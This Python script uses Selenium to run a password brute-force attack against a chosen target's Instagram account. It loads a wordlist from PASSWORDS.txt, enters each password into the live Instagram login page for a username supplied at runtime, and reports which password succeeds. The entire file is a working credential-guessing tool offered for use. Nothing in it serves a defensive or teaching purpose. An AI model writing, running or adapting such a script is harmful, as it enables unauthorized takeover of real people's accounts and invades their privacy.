import os
import requests
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

current_dir = os.getcwd()
PASS_FILE = f"{current_dir}\\PASSWORDS.txt"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}
driver = webdriver.Chrome(executable_path="C:\\bin\\chromedriver_win32\\chromedriver.exe")
url = "https://instagram.com/accounts/login/"
driver.get(url)

def file_handler(updated_data):
    with open("OUTPUT.txt", "wb") as output:
        output.write(str.encode(updated_data))


def brute_force(username_value):
    pass_list = []
    with open(f'{current_dir}\\PASSWORDS.txt', 'r') as f:
        for line in f:
            pass_list.append(line.strip('\n'))

    for password in pass_list:
        driver.get(url)
        time.sleep(5)
        resp = requests.get(url, headers=headers)
        if resp.status_code == 200:
            print("Trying password: " + str(password))
            time.sleep(5)
            email = driver.find_element_by_name('username')
            email.send_keys(username_value)
            time.sleep(5)
            pwd = driver.find_element_by_name('password')
            time.sleep(2)
            pwd.send_keys(password)
            time.sleep(2)
            pwd.send_keys(Keys.RETURN)
            print("button Pressed!!")

            time.sleep(5)
            if driver.current_url != url and "Login" not in driver.title:
                print("[*] Pass found!!", password)
                driver.close()#optional
            else:
                print(password, "didnt work")

if __name__ == "__main__":
    username_input = str(input("Enter the target username: "))

    brute_force(username_input)